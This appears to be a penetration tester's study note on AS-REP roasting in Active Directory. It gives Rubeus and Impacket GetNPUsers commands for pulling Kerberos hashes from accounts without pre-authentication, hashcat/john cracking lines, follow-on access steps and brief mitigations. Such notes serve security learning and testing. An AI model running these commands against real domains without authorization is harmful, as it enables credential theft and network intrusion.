# AS-REP Roasting
This is a technique used to dump the hashes of users that have pre-authentication disabled.

*Note: During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request*

##### Using Rebeus, locally.
Download from the Release page -> [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

Execution Guide: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat 

```
Rubeus.exe asreproast
```

##### Using Impacket, remotely. 
Before we can use Impacket, we need to enumerate a list of users from the domain. To do this we can use **Kerbrute** to get a list of users [obsidian://open?vault=Security%20%26%20PenTesting&file=Enumeration%2FActive%20Directory%2FKerbrute](obsidian://open?vault=Security%20%26%20PenTesting&file=Enumeration%2FActive%20Directory%2FKerbrute)

AS-REP roasting works when pre-authentication is disabled. **Kerbrute** can tell us this. If it is disabled we can request a TGT from the KDC and then extract the hash returned (which contains the account password), and the crack it.

*Run for a userfile.txt* 

```
GetNPUsers.py -request -usersfile USERS_FROM_KERBRUTE -dc-ip DOMAIN_CONTROLLER DNS_DOMAIN/
```

*Run each individual user*

```
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done
```

##### Crack The Hash

```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
john hash.txt /usr/share/wordlists/rockyou.txt
```


**Next**
We can do any of the following.

- enumerate [SMB](obsidian://open?vault=Security%20%26%20PenTesting&file=Enumeration%2FNetwork%2FSMB) , [RPC](obsidian://open?vault=Security%20%26%20PenTesting&file=Enumeration%2FNetwork%2FRPC) or [LDAP](obsidian://open?vault=Security%20%26%20PenTesting&file=Enumeration%2FNetwork%2FLDAP)
- extract data using [Bloodhound](obsidian://open?vault=Security%20%26%20PenTesting&file=Enumeration%2FActive%20Directory%2FTooling%2FBloodHound) 
- gain access through either [PsExec](obsidian://open?vault=Security%20%26%20PenTesting&file=Access%2FWindows%20%26%20Active%20Directory%2FPsExec) or [Evil-WinRM](obsidian://open?vault=Security%20%26%20PenTesting&file=Access%2FWindows%20%26%20Active%20Directory%2FEvil%20WinRM)

#### AS-REP Roasting Mitigations 
-   Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective

-   Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.